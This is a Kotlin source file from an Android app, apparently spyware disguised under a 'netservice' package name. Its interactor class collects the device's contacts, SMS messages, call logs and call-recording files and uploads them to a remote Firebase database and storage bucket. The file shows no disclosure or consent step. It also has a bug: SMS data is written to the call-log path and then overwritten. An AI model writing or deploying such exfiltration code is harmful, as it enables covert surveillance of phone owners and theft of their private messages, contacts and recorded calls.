package com.dtz.netservice.services.connect

import android.content.Context
import android.net.Uri
import android.os.Environment
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.services.base.BaseInteractorService
import com.dtz.netservice.utils.CallLogs
import com.dtz.netservice.utils.Consts
import com.dtz.netservice.utils.Contacts
import com.dtz.netservice.utils.SMSes
import java.io.File
import javax.inject.Inject


class InteractorConnect<S : InterfaceServiceConnect> @Inject constructor(
    context: Context,
    firebase: InterfaceFirebase
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorConnect<S> {


    override fun startContacts() {
        sendContacts(getContext())
    }

    override fun startCallsSending() {
        sendCallsFiles(getContext())
    }

    override fun startMessages() {
        sendMessages(getContext())
    }

    override fun startCallLogs() {
        sendCallLogs(getContext())
    }

    private fun sendContacts(context: Context) {
        val contactsList = Contacts.contactsList(context)
        firebase().getDatabaseReference("${Consts.CONTACTS}/").setValue(contactsList)
    }

    private fun sendCallsFiles(context: Context) {
        getRecordsLists(context)
    }

    private fun sendMessages(context: Context) {
        val smsList = SMSes.smsList(context)
        firebase().getDatabaseReference("${Consts.CALLLOGS}/").setValue(smsList)
    }

    private fun sendCallLogs(context: Context) {
        val callList = CallLogs.callList(context)
        firebase().getDatabaseReference("${Consts.CALLLOGS}/").setValue(callList)
    }

    private fun getRecordsLists(context: Context) {
        val callsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
        File(callsDir).walk().forEach {
            val file = File(it.path)
            if (file.isFile) {
                uploadCallFile(file)
            }
        }
    }

    private fun uploadCallFile(file: File) {
        val uri = Uri.fromFile(file)
        firebase().getStorageReference("recording_calls/${uri.lastPathSegment}")
            .putFile(uri)
            .addOnSuccessListener { taskSnapshot ->
                val callMap: MutableMap<String, Any> = mutableMapOf()
                callMap["file"] = taskSnapshot.metadata?.path.toString()
                callMap["size"] = taskSnapshot.metadata?.sizeBytes.toString()
                callMap["date"] = taskSnapshot.metadata?.creationTimeMillis.toString()

                val name = uri.lastPathSegment.toString().replace(".", "")
                saveLink(callMap, name)
            }

    }

    private fun saveLink(callMap: MutableMap<String, Any>, lastPathSegment: String) {
        firebase().getDatabaseReference("recording_calls")
            .child(lastPathSegment)
            .updateChildren(callMap)
    }

}